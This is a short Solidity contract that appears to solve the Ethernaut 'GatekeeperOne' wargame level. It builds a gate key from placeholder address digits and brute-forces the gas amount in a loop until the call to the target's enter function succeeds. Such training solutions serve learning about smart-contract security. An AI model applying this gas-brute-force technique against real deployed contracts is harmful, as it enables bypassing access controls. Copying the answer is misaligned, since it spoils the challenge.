// SPDX-License-Identifier: MIT
import "hardhat/console.sol";   // Helpful for debug in Remix-IDE
pragma solidity ^0.8.0;

contract FinalSol{
    address a = Put_your_Ethernaut_GatekeeperOne_Contract_Address_Here;
    bytes8 _data = 0x8b0709d90000<Last_4_Digit_of_Your_Address>;     // Ex: 0x8b0709d90000ddc4 

    function attack() public {
        bool S;
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _data);
        for (uint256 i=0; !S; ++i){
            (bool success, ) = a.call{gas: 10 * 8191 + i}(payload);
            S = success;
            // console.log(10 * 8191 + i);
        }
        
        console.log("You are Done!");
    }
}
